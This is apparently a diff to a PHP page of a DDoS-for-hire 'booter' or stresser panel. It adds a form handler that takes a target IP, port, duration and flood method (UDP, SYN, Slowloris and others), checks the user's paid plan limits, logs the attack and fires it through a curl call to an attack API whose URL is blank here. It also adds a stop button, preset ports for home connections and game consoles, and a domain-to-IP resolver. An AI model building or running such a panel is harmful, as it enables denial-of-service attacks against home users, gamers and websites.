@@ -17,6 +17,17 @@ if (!($user -> notBanned($odb)))
 	header('location: login.php');
 	die();
 }
+function opensite($url)
+       {      
+       $ch = curl_init();
+       $timeout = 2;
+       curl_setopt($ch,CURLOPT_URL,$url);
+       curl_setopt($ch, CURLOPT_TIMEOUT, 3);
+       curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+       $data = curl_exec($ch);
+       curl_close($ch);
+       
+       }
 ?>
 <!DOCTYPE html>
 <!--[if IE 8]>    <html class="no-js ie8 ie" lang="en"> <![endif]-->
@@ -110,7 +121,7 @@ if (!($user -> notBanned($odb)))
 							
 							<!-- Breadcrumbs -->
 							<ul class="breadcrumb">
-								<li><a href="#"><span class="icon-home"></span> Home</a> <span class="icon-chevron-right"></span></li>
+								<li><a href="#"><span class="icon-home"></span>Home</a> <span class="icon-chevron-right"></span></li>
 								<li class="active">Hub</li>
 							</ul>
 							<!-- Breadcrumbs -->
@@ -129,6 +140,101 @@ if (!($user -> notBanned($odb)))
 											</ul>
 										</header>
 
+										<!--Attack Curl Configurations -->
+										<?php
+		if (isset($_POST['attackBtn']))
+		{
+			$host = $_POST['host'];
+			$port = intval($_POST['port']);
+			$time = intval($_POST['time']);
+			$method = $_POST['method']; 
+            $user = $_SESSION['username'];
+			$errors = array();
+
+			if (empty($host) || empty($time) || empty($port) || empty($method))
+			{
+				$errors[] = 'Please verify all fields';
+			}
+			if (!filter_var($host, FILTER_VALIDATE_IP))
+			{
+				$errors[] = 'Host is invalid';
+			}
+			$allowedMethods = array('udp', 'ssyn', 'arme', 'get', 'post', 'head', 'rudy', 'slow', 'stop', 'essyn', 'udp-lag');
+			if (!in_array($method, $allowedMethods))
+			{
+				$errors[] = 'Method is invalid';
+			}
+			$SQLCheckBlacklist = $odb -> prepare("SELECT COUNT(*) FROM `blacklist` WHERE `IP` = :host");
+			$SQLCheckBlacklist -> execute(array(':host' => $host));
+			$countBlacklist = $SQLCheckBlacklist -> fetchColumn(0);
+			if ($countBlacklist > 0)
+			{
+				$errors[] = 'IP was blacklisted by an admin';
+			}
+			if (empty($errors))
+			{
+				$checkRunningSQL = $odb -> prepare("SELECT COUNT(*) FROM `logs` WHERE `user` = :username  AND `time` + `date` > UNIX_TIMESTAMP()");
+				$checkRunningSQL -> execute(array(':username' => $_SESSION['username']));
+				$countRunning = $checkRunningSQL -> fetchColumn(0);
+				if ($countRunning == 0)
+				{
+					$SQLGetTime = $odb -> prepare("SELECT `plans`.`mbt` FROM `plans` LEFT JOIN `users` ON `users`.`membership` = `plans`.`ID` WHERE `users`.`ID` = :id");
+					$SQLGetTime -> execute(array(':id' => $_SESSION['ID']));
+					$maxTime = $SQLGetTime -> fetchColumn(0);
+					if (!($time > $maxTime))
+					{
+						$insertLogSQL = $odb -> prepare("INSERT INTO `logs` VALUES(:user, :ip, :port, :time, :method, UNIX_TIMESTAMP())");
+						$insertLogSQL -> execute(array(':user' => $_SESSION['username'], ':ip' => $host, ':port' => $port, ':time' => $time, ':method' => $method));
+						echo '<div class="nNote nSuccess hideit"><p><strong>SUCCESS: </strong>Attack has been sent to '.$host.':'.$port.' for '.$time.' seconds using '.$method.'</p></div>';
+						
+						
+							opensite("");
+
+						
+						
+					}
+					else
+					{
+						echo '<div class="nNote nFailure hideit"><p><strong>ERROR: </strong>Your max boot time is '.$maxTime.'</p></div>';
+					}
+				}
+				else
+				{
+					echo '<div class="nNote nFailure hideit"><p><strong>ERROR: </strong>You currently have a boot running.  Please wait for it to be over.</p></div>';
+				}
+			}
+			else
+			{
+				echo '<div class="nNote nFailure hideit"><p><strong>ERROR:</strong><br />';
+				foreach($errors as $error)
+				{
+					echo '-'.$error.'<br />';
+				}
+				echo '</div>';
+		}
+		}
+				if (isset($_POST['stopBtn']))
+		{
+		
+		$checkRunningSQL = $odb -> prepare("SELECT ip,port,time,method,user,date FROM `logs` WHERE `user` = :username  AND `time` + `date` > UNIX_TIMESTAMP()");
+		$checkRunningSQL -> execute(array(':username' => $_SESSION['username']));
+		$getserver2 = $checkRunningSQL -> fetchAll();
+		$count = $checkRunningSQL -> rowCount();
+		$user = $_SESSION['username'];
+		
+		if ($count == 1)
+		{				
+							opensite("");
+		}
+
+		$updatepid = $odb -> prepare("UPDATE `logs` SET `time`=:timeto WHERE `user`= :user AND `date`= :date");
+		
+		echo '<div class="nNote nSuccess hideit"><p><strong>SUCCESS: </strong>Stress Has Been Stopped But You Must Wait The Remainder To Attack Again</p></div>';	
+		
+		}
+		?>
+										
+										
 										<!-- Tab content -->
 										<section class="tab-content">
 													
@@ -149,7 +255,7 @@ if (!($user -> notBanned($odb)))
 																			<label class="control-label" for="input">Target IP</label>
 																			<div class="controls">
 																				<input id="input" class="input-xlarge" type="text">
-																				<p class="help-block">The IP to flood</p>
+																				<p class="help-block">The IP to Attack</p>
 																			</div>
 																		</div>
 																		<div class="control-group">
@@ -158,11 +264,9 @@ if (!($user -> notBanned($odb)))
 																			<select name="portSelect" onchange="this.form.elements['port'].value=this.value">
 																			<option value="">Select A Preset Port</option>
 																			<option value="80">Home Connection: (80) </option>
-																			<option value="3074">Xbox: (3074)</option>
+																			<option value="3074">Xbox360: (3074)</option>
 																			<option value="3478">PS3: (3478)</option>
 																			</select>
-																				<input id="input" class="input-xlarge" type="text">
-																				<p class="help-block">The port to flood</p>
 																			</div>
 																		</div>
 																		<div class="control-group">
@@ -181,8 +285,8 @@ if (!($user -> notBanned($odb)))
        <select name=method id=method>
 <optgroup label="Layer-4">
                                 <option value="udp" selected>UDP</option>
-                                <option value="udplag">UDP-LAG</option>
                                 <option value="ssyn">SSYN</option>
+								<option value="udp-lag">UDP-LAG</option>
                               </optgroup>
                             
                               <optgroup label="Layer-7">
@@ -192,13 +296,33 @@ if (!($user -> notBanned($odb)))
                                   <option value="head">HEAD</option>
                                   <option value="post">POST</option>
                                   <option value="slow">SLOWLORIS</option>
-
+								  <option value="essyn">ESSYN</option>
                               </optgroup>
        </select>
       </div>
+																		<!--Attack and stop button -->
 																		<div class="form-actions">
-																			<button class="btn btn-alt btn-large btn-primary" type="submit">Send Attack</button>
+																			<button class="btn btn-alt btn-large btn-primary" type="submit" name="attackBtn">Send Attack</button>
+																			<button class="btn btn-alt btn-large btn-danger" type="submit" name="stopBtn">Stop Attack</button>
 																		</div>
+																		
+																		<!--Domain To IP RESOLVER -->
+																		<?php 
+		$resolved = '';
+		$domain = '';
+		if (isset($_POST['resolveBtn']))
+		{
+			$domain = $_POST['domain'];
+			$resolved = gethostbyname($domain);
+		}
+		?>
+		<div class="formRow">
+						<?php echo $resolved;?>
+						<input type="submit" value="Resolve" name="resolveBtn" class="dblueB logMeIn" />
+						<div class="clear"></div>
+                    </div>
+                </div>
+																		
 																	</fieldset>
 																</form>
 															</section>
